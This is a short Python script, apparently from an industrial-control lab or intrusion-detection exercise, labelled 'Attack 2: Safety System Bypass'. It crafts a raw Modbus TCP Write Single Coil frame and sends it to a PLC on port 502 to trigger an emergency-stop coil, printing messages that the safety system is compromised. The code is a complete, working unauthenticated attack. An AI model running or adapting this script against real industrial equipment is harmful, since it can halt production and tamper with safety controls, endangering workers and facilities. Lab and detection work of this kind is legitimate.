print("==============================================")
print("    ATTACK 2: SAFETY SYSTEM BYPASS            ")
print("==============================================")
print("Target:    PLC Emergency Stop (Coil address 0)")
print("Method:    Unauthorized Write Single Coil")
print("Impact:    Production halt, safety compromise")
print("Signature: Function code 0x05 to register 0")
print("----------------------------------------------")

import socket
import struct

target = "192.168.30.2"
port = 502

# Modbus TCP frame: Write Single Coil (0x05) to address 0
# Transaction: 0x0001, Protocol: 0x0000, Length: 0x0006
# Unit: 0x01, Function: 0x05, Address: 0x0000, Value: 0xFF00 (ON)
modbus_frame = bytes.fromhex('00010000000601050000FF00')

print("[01/01] Crafting Emergency Stop command...")
print("        Function: Write Single Coil (0x05)")
print("        Address:  Coil 0 (Emergency Stop)")

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    
    print("[02/01] Connecting to PLC...")
    sock.connect((target, port))
    
    print("[03/01] Sending malicious command...")
    sock.send(modbus_frame)
    
    print("[04/01] Waiting for response...")
    response = sock.recv(1024)
    
    if response:
        print("----------------------------------------------")
        print(">>> EMERGENCY STOP COMMAND SENT SUCCESSFULLY!")
        print(f"Response: {response.hex()[:20]}...")
        print(">>> SAFETY SYSTEM COMPROMISED!")
    else:
        print("----------------------------------------------")
        print("Command sent but no response received")
        
except Exception as e:
    print("----------------------------------------------")
    print(f"ERROR: {str(e)[:50]}...")
finally:
    try:
        sock.close()
    except:
        pass

print("==============================================")
print("       [ ATTACK 2 SIMULATION COMPLETE ]       ")
print("==============================================")
